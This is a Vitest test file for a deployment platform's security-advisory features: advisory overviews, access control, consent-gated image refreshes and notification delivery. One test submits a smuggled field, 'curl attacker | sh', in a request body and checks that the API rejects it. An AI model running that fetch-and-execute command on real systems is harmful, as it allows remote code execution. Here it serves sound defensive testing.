import { beforeEach, describe, expect, it, vi } from "vitest";
import { Hono } from "hono";
import { db, schema, repos, seedOwner, installFakeRunner } from "../jobs/_harness";
import { eq } from "@repo/db";
import { OpenshipClient } from "@repo/sdk/client";
import { createShip } from "@repo/sdk/native";
import { getPlatformKernel } from "@repo/platform/engine/lib/platform";
import { updatesRoutes } from "../../../src/modules/updates/updates.routes";
import { healthRoutes } from "../../../src/modules/health/health.routes";
import { handleApiError } from "../../../src/middleware/error-handler";
import { buildBackgroundContext } from "@repo/platform/engine/lib/background-context";
import {
  applySecurityAdvisory,
  setProjectSecurityPolicy,
  reconcileSecurityRefreshes,
  scanSecurityAdvisories,
} from "@repo/platform/engine/modules/updates/security.service";
import { securityOverview } from "@repo/platform/engine/modules/updates/security-overview";
import { securityProbeKey } from "@repo/platform/engine/modules/updates/security-inventory";
import {
  assertSecurityRefreshConfiguration,
  assertSecurityUpdateEnvironment,
} from "@repo/platform/engine/modules/updates/security-refresh-guard";
import { notification } from "@repo/platform/engine/lib/notification-dispatcher";
import { notificationPreferenceAllows } from "@repo/platform/engine/lib/notification-preferences";
import { projectServicesToDeployableServices } from "@repo/platform/engine/modules/deployments/compose/project-services";
import {
  buildConfigSnapshot,
  resolveSnapshotTarget,
} from "@repo/platform/engine/modules/deployments/build.service";
import { decryptEnvMap } from "@repo/platform/engine/lib/encryption";
import { env } from "@repo/platform/engine/config/env";

const h = vi.hoisted(() => ({
  feed: vi.fn(),
  deploy: vi.fn(),
  digest: vi.fn(),
  environment: vi.fn(),
}));
vi.mock("@repo/platform/engine/modules/services/service-environment-state", async (original) => ({
  ...(await original<object>()),
  assertSyncedServiceEnvironment: h.environment,
}));
vi.mock("@repo/platform/engine/modules/updates/advisory-feed", () => ({ getAdvisoryFeed: h.feed }));
vi.mock("@repo/platform/engine/modules/deployments/build.service", async (original) => ({
  ...(await original<object>()),
  triggerDeployment: h.deploy,
}));
vi.mock("@repo/platform/engine/lib/image-registry", async (original) => ({
  ...(await original<object>()),
  resolveLatestImageDigest: h.digest,
}));
installFakeRunner();
const app = new Hono()
  .onError(handleApiError)
  .route("/api/health", healthRoutes)
  .route("/api/updates", updatesRoutes);
const OLD = `sha256:${"a".repeat(64)}`,
  FIXED = `sha256:${"b".repeat(64)}`;
const notice = {
  id: "image-patch",
  revision: 1,
  severity: "critical",
  title: "Patch the image",
  message: "A published fix is available.",
  url: "https://example.com/security",
  publishedAt: new Date().toISOString(),
  action: "refresh-images",
  targets: [
    {
      kind: "image",
      repository: "docker.io/library/node",
      affectedDigests: [OLD],
      affectedTags: ["22"],
      fixedDigests: [FIXED],
    },
  ],
};
beforeEach(() => {
  h.environment.mockReset().mockResolvedValue({ SERVICE_TOKEN: "service-only-secret" });
  h.deploy.mockReset().mockResolvedValue({ deployment: { id: "new-secure-deployment" } });
  h.digest.mockReset().mockResolvedValue(FIXED);
  h.feed.mockReset().mockResolvedValue({
    security: {
      format: 1,
      revision: 9,
      issuedAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 86400000).toISOString(),
      advisories: [notice],
    },
    stale: false,
    error: null,
    checkedAt: new Date().toISOString(),
    nextCheckAt: null,
    release: { latest: null, manifest: null },
  });
});
async function fixture(owner?: Awaited<ReturnType<typeof seedOwner>>) {
  owner ??= await seedOwner();
  const slug = `security-${crypto.randomUUID()}`;
  const group = await repos.projectGroup.create({
    organizationId: owner.orgId,
    name: "Security",
    slug,
  });
  const project = await repos.project.create({
    organizationId: owner.orgId,
    groupId: group.id,
    name: "Security",
    slug,
    framework: "docker-compose",
    gitProvider: "upload",
    runtimeMode: "docker",
    hasServer: true,
  });
  const service = await repos.service.create({
    projectId: project.id,
    name: "web",
    image: "node:22",
    enabled: true,
  });
  const deployment = await repos.deployment.create({
    projectId: project.id,
    organizationId: owner.orgId,
    branch: "main",
    environment: "production",
    status: "ready",
    meta: {
      ...buildConfigSnapshot(project, "main"),
      ...(await resolveSnapshotTarget(project)),
      runtimeMode: "docker",
      composeServices: projectServicesToDeployableServices([service]),
    },
  });
  await repos.project.update(project.id, { activeDeploymentId: deployment.id });
  await repos.service.upsertServiceDeployment({
    serviceId: service.id,
    deploymentId: deployment.id,
    status: "success",
    imageRef: service.image,
    imageDigest: OLD,
    containerId: "fixture-container",
  });
  const inventory = {
    deploymentId: deployment.id,
    checkedAt: new Date().toISOString(),
    images: [
      {
        serviceId: service.id,
        serviceName: service.name,
        ref: service.image,
        role: "image",
        digest: OLD,
      },
    ],
    runtimes: [],
    unknownServices: [],
    probeKey: securityProbeKey((await h.feed()).security.advisories),
  };
  await repos.securityAdvisory.saveInventory(
    project.id,
    owner.orgId,
    deployment.id,
    inventory,
    new Date(),
  );
  const ctx = buildBackgroundContext({ userId: owner.userId, organizationId: owner.orgId });
  const client = new OpenshipClient({
    baseUrl: "http://openship.test",
    token: owner.token,
    organizationId: owner.orgId,
    fetch: ((url, init) => app.request(url as string, init)) as typeof fetch,
  });
  return {
    owner,
    project,
    service,
    deployment,
    ctx,
    client,
    input: { advisoryId: notice.id, deploymentId: deployment.id, serviceId: service.id },
  };
}

describe("security operations", () => {
  it.each([
    { trigger: "rollback", meta: {} },
    { trigger: "manual", meta: { adopt: true } },
    { trigger: "manual", meta: { handoverAppImage: "openship/app:bld_old" } },
    { trigger: "manual", meta: { refreshAppDeploymentId: "older-source" } },
  ])(
    "reports the source redeploy prerequisite consistently before a replayed-source action ($trigger/$meta)",
    async ({ trigger, meta }) => {
      const f = await fixture();
      await repos.service.remove(f.service.id);
      await repos.project.update(f.project.id, {
        framework: "laravel",
        runtimeVersion: "8.4",
        gitProvider: "github",
        gitUrl: "https://github.com/example/source.git",
        gitOwner: "example",
        gitRepo: "source",
      });
      const source = (await repos.project.findById(f.project.id))!;
      const snapshot = {
        ...buildConfigSnapshot(source, "main"),
        ...(await resolveSnapshotTarget(source)),
      };
      await db
        .update(schema.deployment)
        .set({
          trigger,
          commitSha: "1111111111111111111111111111111111111111",
          meta: { ...snapshot, ...meta },
        })
        .where(eq(schema.deployment.id, f.deployment.id));
      await repos.securityAdvisory.saveInventory(
        f.project.id,
        f.owner.orgId,
        f.deployment.id,
        {
          deploymentId: f.deployment.id,
          checkedAt: new Date().toISOString(),
          probeKey: securityProbeKey((await h.feed()).security.advisories),
          images: [
            { serviceId: null, serviceName: null, ref: "node:22", role: "image", digest: OLD },
          ],
          runtimes: [],
          unknownServices: [],
        },
        new Date(),
      );
      const detail = await f.client.updates.security(f.project.id);
      const overview = await securityOverview(f.ctx, await h.feed());
      for (const result of [detail, overview.projects.find((p) => p.projectId === f.project.id)!]) {
        expect(result.findings).toHaveLength(1);
        expect(result.findings[0]).toMatchObject({
          canRefresh: false,
          sourceRedeployRequired: true,
        });
        expect(result.findings[0].refreshBlockedReason).toContain("replayed artifact");
      }
      // Eligibility is checked live from the existing deployment records; repairing
      // provenance does not need a duplicate inventory cache or another runtime probe.
      await db
        .update(schema.deployment)
        .set({ trigger: "manual", meta: snapshot })
        .where(eq(schema.deployment.id, f.deployment.id));
      const repaired = await f.client.updates.security(f.project.id);
      expect(repaired.findings[0]).toMatchObject({ canRefresh: true });
      expect(repaired.findings[0]).not.toHaveProperty("sourceRedeployRequired");
      expect(h.deploy).not.toHaveBeenCalled();
      expect(h.digest).not.toHaveBeenCalled();
    },
  );

  it("aggregates only authorized current observations, without running a deployment or registry check", async () => {
    const f = await fixture(),
      other = await fixture();
    const hidden = await fixture(f.owner);
    const direct = await securityOverview(f.ctx, await h.feed());
    await getPlatformKernel().updates.advisories(f.ctx);
    const result = await f.client.updates.advisories();
    expect(result.overview).toEqual(direct);
    expect(result.overview.projects.map((p) => p.projectId).sort()).toEqual(
      [f.project.id, hidden.project.id].sort(),
    );
    expect(result.overview.projects[0].findings[0]).toMatchObject({
      id: notice.id,
      serviceName: "web",
    });
    expect(JSON.stringify(result.overview)).not.toContain(other.project.id);
    const feed = await h.feed();
    await db
      .update(schema.member)
      .set({ role: "restricted" })
      .where(eq(schema.member.userId, f.owner.userId));
    const restricted = { ...f.ctx, role: "restricted" as const };
    expect(await securityOverview(restricted, feed)).toEqual({
      projects: [],
      pendingProjects: 0,
      unknownProjects: 0,
    });
    await repos.resourceGrant.upsert({
      organizationId: f.owner.orgId,
      userId: f.owner.userId,
      resourceType: "project",
      resourceId: f.project.id,
      permissions: ["read"],
      grantedByUserId: f.owner.userId,
    });
    expect((await securityOverview(restricted, feed)).projects.map((p) => p.projectId)).toEqual([
      f.project.id,
    ]);
    const stale = await securityOverview(f.ctx, { ...feed, stale: true });
    expect(stale.projects[0].findings[0].canRefresh).toBe(false);
    const replacement = await repos.deployment.create({
      projectId: f.project.id,
      organizationId: f.owner.orgId,
      branch: "main",
      status: "ready",
    });
    await repos.project.update(f.project.id, { activeDeploymentId: replacement.id });
    const after = await securityOverview(restricted, feed);
    expect(after.pendingProjects).toBe(1);
    expect(after.projects).toEqual([
      expect.objectContaining({ projectId: f.project.id, findings: [], checkedAt: null }),
    ]);
    // Consent remains available globally after a warning clears, or the service stops.
    await repos.securityAdvisory.policy(f.project.id, f.owner.orgId, f.owner.userId, true);
    await repos.project.update(f.project.id, { activeDeploymentId: null });
    expect((await securityOverview(restricted, { ...feed, security: null })).projects).toEqual([
      expect.objectContaining({ projectId: f.project.id, autoRefresh: true, findings: [] }),
    ]);
    expect(h.deploy).not.toHaveBeenCalled();
    expect(h.digest).not.toHaveBeenCalled();
  });

  it("uses the same authorization and result through native and HTTP clients", async () => {
    const f = await fixture();
    const user = (await repos.user.findById(f.owner.userId))!;
    const ship = createShip({
      platform: getPlatformKernel(),
      identity: {
        resolve: async () => ({
          user: { id: user.id, email: user.email, name: user.name },
          sessionId: "security-test",
        }),
      },
    });
    const native = await ship.scope({ identity: "verified", organizationId: f.owner.orgId });
    expect(await native.updates.security(f.project.id)).toEqual(
      await f.client.updates.security(f.project.id),
    );
    await native.updates.securityPolicy(f.project.id, { autoRefresh: true });
    expect((await f.client.updates.security(f.project.id)).autoRefresh).toBe(true);
    await native.updates.applySecurity(f.project.id, f.input);
    expect(h.deploy.mock.calls[0][1]).toMatchObject({
      serviceIds: [f.service.id],
      strictServiceScope: true,
    });
    await db
      .update(schema.member)
      .set({ role: "restricted" })
      .where(eq(schema.member.userId, f.owner.userId));
    await repos.resourceGrant.upsert({
      organizationId: f.owner.orgId,
      userId: f.owner.userId,
      resourceType: "project",
      resourceId: f.project.id,
      permissions: ["read"],
      grantedByUserId: f.owner.userId,
    });
    await expect(
      native.updates.securityPolicy(f.project.id, { autoRefresh: false }),
    ).rejects.toThrow();
    await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow();
  });
  it("defaults to notices only, rejects foreign projects and cannot accept remote commands", async () => {
    const f = await fixture(),
      other = await fixture();
    const result = await f.client.updates.security(f.project.id);
    expect(result.autoRefresh).toBe(false);
    expect(result.findings[0]).toMatchObject({
      id: notice.id,
      confidence: "confirmed",
      serviceId: f.service.id,
    });
    await expect(other.client.updates.security(f.project.id)).rejects.toThrow();
    await expect(
      other.client.updates.securityPolicy(f.project.id, { autoRefresh: true }),
    ).rejects.toThrow();
    const invalid = await app.request(`/api/updates/${f.project.id}/security/apply`, {
      method: "POST",
      headers: { ...f.owner.auth, "Content-Type": "application/json" },
      body: JSON.stringify({ ...f.input, command: "curl attacker | sh" }),
    });
    expect(invalid.status).toBe(400);
    expect(h.deploy).not.toHaveBeenCalled();
  });
  it("manual refresh uses the existing pipeline with exact service scope and stale-deployment protection", async () => {
    const f = await fixture();
    const result = await f.client.updates.applySecurity(f.project.id, f.input);
    expect(result.deployment_id).toBe("new-secure-deployment");
    expect(h.deploy.mock.calls[0][1]).toMatchObject({
      serviceIds: [f.service.id],
      strictServiceScope: true,
      forcePullImages: true,
      trigger: "update",
    });
    expect(h.deploy.mock.calls[0][1].reuseSnapshot).toBeUndefined();
    await expect(
      f.client.updates.applySecurity(f.project.id, { ...f.input, deploymentId: "stale" }),
    ).rejects.toThrow();
    h.feed.mockResolvedValue({ ...(await h.feed()), stale: true });
    await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow();
    expect(h.deploy).toHaveBeenCalledTimes(1);
  });
  it("automatic refresh needs consent, freezes the signed replacement and admits it once", async () => {
    const f = await fixture();
    await expect(applySecurityAdvisory(f.ctx, f.project.id, f.input, true)).rejects.toThrow();
    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
    await applySecurityAdvisory(f.ctx, f.project.id, f.input, true);
    const input = h.deploy.mock.calls[0][1];
    expect(input.reuseSnapshot).toBeUndefined();
    expect(input.envVars).toBeUndefined();
    expect(input.securityApproval).toMatchObject({
      deploymentId: f.deployment.id,
      serviceId: f.service.id,
      image: `docker.io/library/node@${FIXED}`,
      environmentFingerprint: expect.stringMatching(/^[a-f0-9]{64}$/),
    });
    expect(JSON.stringify(input)).not.toContain("service-only-secret");
    const resolved = { SERVICE_TOKEN: "service-only-secret" };
    assertSecurityUpdateEnvironment(f.project.id, input.securityApproval, f.service, resolved);
    expect(resolved).toEqual({ SERVICE_TOKEN: "service-only-secret" });
    expect(() =>
      assertSecurityUpdateEnvironment(f.project.id, input.securityApproval, f.service, {
        SERVICE_TOKEN: "later-value",
      }),
    ).toThrow(/environment changed/);
    expect((await repos.service.findById(f.service.id))?.image).toBe("node:22");
    await applySecurityAdvisory(f.ctx, f.project.id, f.input, true);
    expect(h.deploy).toHaveBeenCalledTimes(1);
  });
  it("does not automatically deploy an unverified replacement or changed configuration", async () => {
    const f = await fixture();
    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
    h.digest.mockResolvedValue(`sha256:${"c".repeat(64)}`);
    expect(await applySecurityAdvisory(f.ctx, f.project.id, f.input, true)).toBeNull();
    expect(h.deploy).not.toHaveBeenCalled();
    h.digest.mockResolvedValue(FIXED);
    await repos.service.update(f.service.id, { command: "new command" });
    await expect(applySecurityAdvisory(f.ctx, f.project.id, f.input, true)).rejects.toThrow(
      /configuration changed/,
    );
    expect(h.deploy).not.toHaveBeenCalled();
  });
  it("rechecks consent, permissions and service config when the worker is about to deploy", async () => {
    const f = await fixture();
    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
    await applySecurityAdvisory(f.ctx, f.project.id, f.input, true);
    const approval = h.deploy.mock.calls[0][1].securityApproval;
    const snapshot = {
      ...f.deployment.meta,
      securityApproval: approval,
      targetServiceIds: [f.service.id],
      handoverImages: { web: approval.image },
    };
    const current = (await repos.project.findById(f.project.id))!;
    await assertSecurityRefreshConfiguration(current, snapshot);
    await expect(
      assertSecurityRefreshConfiguration(current, {
        ...snapshot,
        securityApproval: {
          ...snapshot.securityApproval,
          expiresAt: new Date(0).toISOString(),
        },
      }),
    ).rejects.toThrow(/expired/);
    await expect(
      assertSecurityRefreshConfiguration({ ...current, volumes: ["data:/data"] }, snapshot),
    ).rejects.toThrow(/Project configuration changed/);
    h.environment.mockResolvedValueOnce({ SERVICE_TOKEN: "a-later-change" });
    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(
      /environment changed/,
    );
    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: false });
    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(/consent/);
    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
    await repos.service.update(f.service.id, { command: "new saved command" });
    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(
      /configuration changed/,
    );
    await db
      .update(schema.member)
      .set({ role: "restricted" })
      .where(eq(schema.member.userId, f.owner.userId));
    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(
      /authorization/,
    );
  });
  it("only reports a successful automatic patch after its exact replacement becomes active", async () => {
    const f = await fixture();
    const image = `docker.io/library/node@${FIXED}`;
    const deployment = await repos.deployment.create({
      projectId: f.project.id,
      organizationId: f.owner.orgId,
      branch: "main",
      status: "deploying",
    });
    await repos.securityAdvisory.claimAttempt(`verify-${f.project.id}`, f.project.id, {
      advisoryId: notice.id,
      serviceId: f.service.id,
      image,
    });
    await repos.securityAdvisory.finishAttempt(`verify-${f.project.id}`, {
      status: "queued",
      deploymentId: deployment.id,
    });
    await reconcileSecurityRefreshes();
    expect(
      (
        await db
          .select()
          .from(schema.securityRefreshAttempt)
          .where(eq(schema.securityRefreshAttempt.projectId, f.project.id))
      )[0].status,
    ).toBe("queued");
    await repos.deployment.updateStatus(deployment.id, "ready");
    await repos.project.update(f.project.id, { activeDeploymentId: deployment.id });
    await repos.service.upsertServiceDeployment({
      serviceId: f.service.id,
      deploymentId: deployment.id,
      status: "success",
      imageRef: image,
    });
    await reconcileSecurityRefreshes();
    expect(
      (
        await db
          .select()
          .from(schema.securityRefreshAttempt)
          .where(eq(schema.securityRefreshAttempt.projectId, f.project.id))
      )[0].status,
    ).toBe("verified");
    const bad = await fixture();
    await repos.securityAdvisory.claimAttempt(`verify-${bad.project.id}`, bad.project.id, {
      advisoryId: notice.id,
      serviceId: bad.service.id,
      image,
    });
    await repos.securityAdvisory.finishAttempt(`verify-${bad.project.id}`, {
      status: "queued",
      deploymentId: bad.deployment.id,
    });
    await repos.service.upsertServiceDeployment({
      serviceId: bad.service.id,
      deploymentId: bad.deployment.id,
      status: "success",
      imageRef: "node:22",
    });
    await reconcileSecurityRefreshes();
    expect(
      (
        await db
          .select()
          .from(schema.securityRefreshAttempt)
          .where(eq(schema.securityRefreshAttempt.projectId, bad.project.id))
      )[0].status,
    ).toBe("failed");
  });
  it("notifies security advisories even when a workspace has no deployed projects", async () => {
    const owner = await seedOwner();
    const channel = await repos.notificationChannel.create({
      userId: owner.userId,
      kind: "in_app",
      label: "Inbox",
      config: {},
      enabled: true,
      verified: true,
    });
    const feed = await h.feed();
    h.feed.mockResolvedValue({
      ...feed,
      security: {
        ...feed.security,
        advisories: [{ ...notice, targets: [{ kind: "platform", affected: ">=0.0.0" }] }],
      },
    });
    await scanSecurityAdvisories();
    await scanSecurityAdvisories();
    const deliveries = await db
      .select()
      .from(schema.notificationDelivery)
      .where(eq(schema.notificationDelivery.channelId, channel.id));
    expect(deliveries).toHaveLength(1);
    expect(deliveries[0].payload).toMatchObject({ resourceType: "updates", durable: true });
  });
  it("keeps Cloud app alerts notice-only without sending control-plane update prompts to tenants", async () => {
    const f = await fixture();
    const channel = await repos.notificationChannel.create({
      userId: f.owner.userId,
      kind: "in_app",
      label: "Inbox",
      config: {},
      enabled: true,
      verified: true,
    });
    const feed = await h.feed();
    h.feed.mockResolvedValue({
      ...feed,
      security: {
        ...feed.security,
        advisories: [
          notice,
          {
            ...notice,
            id: "control-plane-patch",
            targets: [{ kind: "platform", affected: ">=0.0.0" }],
          },
        ],
      },
      release: {
        latest: null,
        manifest: {
          advisories: [
            {
              id: "control-plane-release",
              severity: "critical",
              announce: true,
              title: "Update Openship",
              message: "Install the patched control plane.",
              affects: ">=0.0.0",
            },
          ],
        },
      },
    });
    const previousCloudMode = env.CLOUD_MODE;
    try {
      env.CLOUD_MODE = true;
      await scanSecurityAdvisories();
      await scanSecurityAdvisories();
    } finally {
      env.CLOUD_MODE = previousCloudMode;
    }
    const deliveries = await db
      .select()
      .from(schema.notificationDelivery)
      .where(eq(schema.notificationDelivery.channelId, channel.id));
    expect(deliveries).toHaveLength(1);
    expect(deliveries[0].payload).toMatchObject({
      resourceType: "project",
      resourceId: f.project.id,
      advisoryId: notice.id,
    });
    expect((await repos.securityAdvisory.project(f.project.id))?.autoRefresh).toBe(false);
    expect(h.deploy.mock.calls.some(([, input]) => input.projectId === f.project.id)).toBe(false);
  });
  it("defaults security alerts to every verified channel while preserving per-channel opt-outs", async () => {
    const f = await fixture();
    const create = (kind: "in_app" | "webhook", verified = true) =>
      repos.notificationChannel.create({
        userId: f.owner.userId,
        label: kind,
        kind,
        config: {},
        enabled: true,
        verified,
      });
    const first = await create("in_app"),
      second = await create("webhook"),
      unverified = await create("webhook", false);
    const input = {
      organizationId: f.owner.orgId,
      eventType: "security.advisory",
      resourceType: "project",
      resourceId: f.project.id,
      idempotencyKey: `security-test:${f.project.id}`,
      payload: { message: "Patch this service." },
    };
    await db.transaction(await notification.prepare(input));
    await db.transaction(await notification.prepare(input));
    const rows = await db
      .select()
      .from(schema.notificationDelivery)
      .where(eq(schema.notificationDelivery.organizationId, f.owner.orgId));
    expect(rows.map((row) => row.channelId).sort()).toEqual([first.id, second.id].sort());
    expect(rows.some((row) => row.channelId === unverified.id)).toBe(false);
    await repos.notificationSubscription.upsert({
      userId: f.owner.userId,
      organizationId: f.owner.orgId,
      category: "security.advisory",
      channelId: first.id,
      enabled: false,
    });
    expect(
      await notificationPreferenceAllows(f.owner.userId, f.owner.orgId, "security.advisory", first),
    ).toBe(false);
    const third = await create("in_app");
    await db.transaction(
      await notification.prepare({ ...input, idempotencyKey: input.idempotencyKey + "-new" }),
    );
    const next = await db
      .select()
      .from(schema.notificationDelivery)
      .where(eq(schema.notificationDelivery.organizationId, f.owner.orgId));
    expect(next.filter((row) => row.channelId === first.id)).toHaveLength(1);
    expect(next.filter((row) => row.channelId === second.id)).toHaveLength(2);
    expect(next.filter((row) => row.channelId === third.id)).toHaveLength(1);
    await repos.notificationDefault.upsert({
      organizationId: f.owner.orgId,
      category: "security.advisory",
      defaultEnabled: true,
      defaultChannelKinds: [],
    });
    expect(
      await notificationPreferenceAllows(
        f.owner.userId,
        f.owner.orgId,
        "security.advisory",
        second,
      ),
    ).toBe(false);
    await db.transaction(
      await notification.prepare({ ...input, idempotencyKey: input.idempotencyKey + "-none" }),
    );
    const after = await db
      .select()
      .from(schema.notificationDelivery)
      .where(eq(schema.notificationDelivery.organizationId, f.owner.orgId));
    expect(after).toHaveLength(next.length);
  });
});
